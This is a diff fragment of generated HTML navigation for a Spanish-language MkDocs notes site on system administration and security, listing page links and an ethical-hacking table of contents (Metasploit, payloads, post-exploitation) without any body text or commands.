+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-1">
+        Mongo
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../bases_datos/mongo/Mongo/" title="Mongo" class="md-nav__link">
+      Mongo
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-2" type="checkbox" id="nav-4-2">
+    
+    <label class="md-nav__link" for="nav-4-2">
+      Postgres
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-2">
+        Postgres
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../bases_datos/postgres/bases/" title="Postgres" class="md-nav__link">
+      Postgres
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../bases_datos/postgres/modificaciones/" title="Modificación tablas" class="md-nav__link">
+      Modificación tablas
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../bases_datos/postgres/plpgsql/" title="Plpgsql" class="md-nav__link">
+      Plpgsql
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../bases_datos/postgres/postgresql-intalacion/" title="Postgresql intalacion" class="md-nav__link">
+      Postgresql intalacion
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      Curiosidades
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Curiosidades
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../curiosidades/Lanzador_aplicaciones_en_gnome/" title="Lanzador aplicaciones en gnome" class="md-nav__link">
+      Lanzador aplicaciones en gnome
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../curiosidades/cambiar_color_promp_terminal/" title="Cambiar color promp terminal" class="md-nav__link">
+      Cambiar color promp terminal
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../curiosidades/conky/" title="conky" class="md-nav__link">
+      conky
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../curiosidades/openbox/" title="Openbox" class="md-nav__link">
+      Openbox
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../curiosidades/qbit/" title="Qbit" class="md-nav__link">
+      Qbit
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../curiosidades/tmux/" title="Tmux" class="md-nav__link">
+      Tmux
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+    
+    <label class="md-nav__link" for="nav-6">
+      Desatendidas
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        Desatendidas
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../desatendidas/" title="Desatendidas" class="md-nav__link">
+      Desatendidas
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../desatendidas/Instalacion-desatendida-debian/" title="Instalacion desatendida debian" class="md-nav__link">
+      Instalacion desatendida debian
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../desatendidas/desatendida-windows/" title="Desatendida windows" class="md-nav__link">
+      Desatendida windows
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../desatendidas/kikstart/" title="Kikstart" class="md-nav__link">
+      Kikstart
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
+    
+    <label class="md-nav__link" for="nav-7">
+      Generar doc
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        Generar doc
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../generar_doc/docsify/" title="Docsify" class="md-nav__link">
+      Docsify
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../generar_doc/remark/" title="Remark" class="md-nav__link">
+      Remark
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8">
+    
+    <label class="md-nav__link" for="nav-8">
+      Lenguajes
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-8">
+        Lenguajes
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../lenguajes/Fundamentos_php/" title="Fundamentos php" class="md-nav__link">
+      Fundamentos php
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../lenguajes/Shell/" title="Shell" class="md-nav__link">
+      Shell
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-3" type="checkbox" id="nav-8-3">
+    
+    <label class="md-nav__link" for="nav-8-3">
+      Python3
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-8-3">
+        Python3
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../lenguajes/python3/Apuntes-Metodos/" title="Métodos de colecciones" class="md-nav__link">
+      Métodos de colecciones
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../lenguajes/python3/apuntes-Funcionalidades_avanzadas/" title="apuntes Funcionalidades avanzadas" class="md-nav__link">
+      apuntes Funcionalidades avanzadas
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../lenguajes/python3/apuntes-Herencia/" title="Herencias" class="md-nav__link">
+      Herencias
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../lenguajes/python3/apuntes-distribucion/" title="Distribución" class="md-nav__link">
+      Distribución
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../lenguajes/python3/apuntes-documentacion/" title="Documentación" class="md-nav__link">
+      Documentación
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../lenguajes/python3/apuntes-ficheros/" title="Apuntes ficheros" class="md-nav__link">
+      Apuntes ficheros
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../lenguajes/python3/apuntes-fundamento/" title="Python fundamentos" class="md-nav__link">
+      Python fundamentos
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../lenguajes/python3/apuntes-modulos/" title="Módulos" class="md-nav__link">
+      Módulos
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../lenguajes/python3/apuntes-orientado-objetos/" title="Orientado a objetos" class="md-nav__link">
+      Orientado a objetos
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../lenguajes/python3/apuntes-test/" title="Test" class="md-nav__link">
+      Test
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../lenguajes/python3/apuntes-tkinter/" title="Tkinter" class="md-nav__link">
+      Tkinter
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../lenguajes/python3/apuntes_bases/" title="Apuntes bases" class="md-nav__link">
+      Apuntes bases
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../lenguajes/python3/argparse/" title="Argparse" class="md-nav__link">
+      Argparse
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">
+    
+    <label class="md-nav__link" for="nav-9">
+      Seguridad
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-9">
+        Seguridad
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../seguridad/Certificados-Digitales/" title="Certificados Digitales" class="md-nav__link">
+      Certificados Digitales
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../seguridad/Kerberos/" title="Kerberos" class="md-nav__link">
+      Kerberos
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../seguridad/OpenVpn/" title="OpenVpn" class="md-nav__link">
+      OpenVpn
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../seguridad/The-crazy-thing/" title="The crazy thing!" class="md-nav__link">
+      The crazy thing!
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../seguridad/TunelSSH/" title="Tunel SSH" class="md-nav__link">
+      Tunel SSH
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../seguridad/gpg/" title="GPG" class="md-nav__link">
+      GPG
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../seguridad/lvm/" title="Lvm logical volum manager" class="md-nav__link">
+      Lvm logical volum manager
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../seguridad/practica-ssl-tls/" title="Practica ssl tls" class="md-nav__link">
+      Practica ssl tls
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../seguridad/raid/" title="Raid" class="md-nav__link">
+      Raid
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-10" type="checkbox" id="nav-9-10">
+    
+    <label class="md-nav__link" for="nav-9-10">
+      Backups
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-9-10">
+        Backups
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../seguridad/backups/Borg_basico/" title="Borg básico" class="md-nav__link">
+      Borg básico
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../seguridad/backups/Tar/" title="Tar" class="md-nav__link">
+      Tar
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../seguridad/backups/rdiff-backup/" title="rdiff-backup" class="md-nav__link">
+      rdiff-backup
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../seguridad/backups/rsync/" title="rsync" class="md-nav__link">
+      rsync
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-11" type="checkbox" id="nav-9-11">
+    
+    <label class="md-nav__link" for="nav-9-11">
+      Cortafuegos
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-9-11">
+        Cortafuegos
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../seguridad/cortafuegos/Iptables/" title="Iptables" class="md-nav__link">
+      Iptables
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-10" type="checkbox" id="nav-10">
+    
+    <label class="md-nav__link" for="nav-10">
+      Sistemas
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-10">
+        Sistemas
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/Actualizar_hora_sys_o_bios/" title="Gestionar Hora" class="md-nav__link">
+      Gestionar Hora
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/Arranque-del-sistema/" title="Arranque del sistema" class="md-nav__link">
+      Arranque del sistema
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/Eliminar_contrase%C3%B1a_windows/" title="Eliminar contraseña windows" class="md-nav__link">
+      Eliminar contraseña windows
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/Estructura_de_directorios/" title="Estructura de directorios" class="md-nav__link">
+      Estructura de directorios
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/Logs_journalctl/" title="Logs" class="md-nav__link">
+      Logs
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/Systemd/" title="Systemd" class="md-nav__link">
+      Systemd
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/chroot/" title="Chroot" class="md-nav__link">
+      Chroot
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/disco/" title="Disco" class="md-nav__link">
+      Disco
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/gestores_de_paquetes/" title="Gestores de paquetes" class="md-nav__link">
+      Gestores de paquetes
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/getenforce/" title="getenforce" class="md-nav__link">
+      getenforce
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/grub/" title="Grub" class="md-nav__link">
+      Grub
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/home/" title="Cambiar /home" class="md-nav__link">
+      Cambiar /home
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/ip_est%C3%A1tica/" title="ip estática raspberry" class="md-nav__link">
+      ip estática raspberry
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/pam/" title="Pam" class="md-nav__link">
+      Pam
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/raid/" title="Raid" class="md-nav__link">
+      Raid
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/xinetd/" title="xinetd" class="md-nav__link">
+      xinetd
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-10-17" type="checkbox" id="nav-10-17">
+    
+    <label class="md-nav__link" for="nav-10-17">
+      Automatizacion
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-10-17">
+        Automatizacion
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/automatizacion/ansible/" title="Ansible" class="md-nav__link">
+      Ansible
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sistemas/automatizacion/tareas_programadas/" title="Tareas Programadas" class="md-nav__link">
+      Tareas Programadas
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-11" type="checkbox" id="nav-11">
+    
+    <label class="md-nav__link" for="nav-11">
+      Virtualizacion
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-11">
+        Virtualizacion
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../virtualizacion/Docker-basico/" title="Docker" class="md-nav__link">
+      Docker
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../virtualizacion/Lxc/" title="LXC y LXD" class="md-nav__link">
+      LXC y LXD
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../virtualizacion/Vagrant/" title="Vagrant" class="md-nav__link">
+      Vagrant
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../virtualizacion/kubernetes/" title="Kubernetes" class="md-nav__link">
+      Kubernetes
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../virtualizacion/swarm/" title="Swarm" class="md-nav__link">
+      Swarm
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-11-6" type="checkbox" id="nav-11-6">
+    
+    <label class="md-nav__link" for="nav-11-6">
+      Virt manager
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-11-6">
+        Virt manager
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../virtualizacion/virt-manager/Backing_chain/" title="Backing_chain" class="md-nav__link">
+      Backing_chain
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../virtualizacion/virt-manager/Clonar/" title="Clonar de virtual a físico y de físico a virtual." class="md-nav__link">
+      Clonar de virtual a físico y de físico a virtual.
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../virtualizacion/virt-manager/Instalacion_de_virtualizacion_fedora/" title="Instalación de virtualización fedora" class="md-nav__link">
+      Instalación de virtualización fedora
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../virtualizacion/virt-manager/acceder_consola_desde_virsh/" title="acceder consola desde virsh" class="md-nav__link">
+      acceder consola desde virsh
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../virtualizacion/virt-manager/crear_red_aislada/" title="Crear red aislada" class="md-nav__link">
+      Crear red aislada
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../virtualizacion/virt-manager/instalar_maquina_virtual_virt-install/" title="virt" class="md-nav__link">
+      virt
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#nociones-basicas" class="md-nav__link">
+    Nociones básicas
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ambitos-de-la-seguridad" class="md-nav__link">
+    Ámbitos de la seguridad
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pruebas-acotadas-dentro-de-hacking-etico" class="md-nav__link">
+    Pruebas acotadas dentro de Hacking Ético
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tipos-de-enfoques" class="md-nav__link">
+    Tipos de enfoques
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vectores-de-ataque" class="md-nav__link">
+    Vectores de ataque
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dispositivos-de-seguridad" class="md-nav__link">
+    Dispositivos de seguridad
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#laboratorio-de-pruebas" class="md-nav__link">
+    Laboratorio de pruebas
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#introduccion-kali" class="md-nav__link">
+    Introducción Kali
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#anonimato" class="md-nav__link">
+    Anonimato
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tunelizacion-de-protocolos" class="md-nav__link">
+    Tunelización de protocolos
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#servidores-proxy" class="md-nav__link">
+    Servidores proxy
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#virtual-private-network-vpn" class="md-nav__link">
+    Virtual Private Network (VPN)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#redes-de-anonimacion" class="md-nav__link">
+    Redes de anonimación
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#proxy" class="md-nav__link">
+    Proxy
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vpn" class="md-nav__link">
+    VPN
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cambiar-mac" class="md-nav__link">
+    Cambiar Mac
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creando-plataforma-anonima" class="md-nav__link">
+    Creando plataforma anónima
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#creando-tuneles" class="md-nav__link">
+    Creando túneles
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tunel-estatico" class="md-nav__link">
+    Túnel Estático
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tunel-dinamico" class="md-nav__link">
+    Túnel dinámico
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#secuencia-de-tuneles" class="md-nav__link">
+    Secuencia de Túneles
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#identificacion-y-explotacion-de-vulnerabilidades-en-sistemas" class="md-nav__link">
+    Identificación y explotación de vulnerabilidades en sistemas
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#metodologia" class="md-nav__link">
+    Metodología
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#obtencion-de-datos" class="md-nav__link">
+    Obtención de datos
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#recoleccion-de-datos" class="md-nav__link">
+    Recolección de datos
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analisis-de-direcciones-ip" class="md-nav__link">
+    Análisis de direcciones ip
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#curiosidad" class="md-nav__link">
+    Curiosidad
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analisis-de-sistemas-autonomos" class="md-nav__link">
+    Análisis de sistemas autónomos
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analisis-de-dominios-y-subdominios" class="md-nav__link">
+    Análisis de dominios y subdominios
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#browser-hacking" class="md-nav__link">
+    Browser Hacking
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#herramienta-para-facilitar-el-analisis" class="md-nav__link">
+    Herramienta para facilitar el análisis
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#extraccion-metadatos" class="md-nav__link">
+    Extracción metadatos
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumeracion" class="md-nav__link">
+    Enumeración
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analisis" class="md-nav__link">
+    Análisis
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#deteccion-vulnerabilidades" class="md-nav__link">
+    Detección vulnerabilidades
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tipologia-de-exploits" class="md-nav__link">
+    Tipología de exploits
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tipos-de-conexion" class="md-nav__link">
+    Tipos de conexión
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#conexion-directa" class="md-nav__link">
+    Conexión directa
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conexion-inversa" class="md-nav__link">
+    Conexión inversa
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#metasploit" class="md-nav__link">
+    Metasploit
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#workspaces" class="md-nav__link">
+    workspaces
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payloads" class="md-nav__link">
+    Payloads
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#explotar-vulnerabilidad" class="md-nav__link">
+    Explotar vulnerabilidad
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#background" class="md-nav__link">
+    Background
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#importar-datos-de-nmap" class="md-nav__link">
+    Importar datos de nmap
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#anadir-modulos" class="md-nav__link">
+    Añadir módulos
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#generar-archivo-con-payload" class="md-nav__link">
+    Generar archivo con payload
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-explotacion" class="md-nav__link">
+    Post-explotación
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#extraer-informacion-del-sistema" class="md-nav__link">
+    Extraer información del sistema
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#elevar-privilegios" class="md-nav__link">
+    Elevar privilegios
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
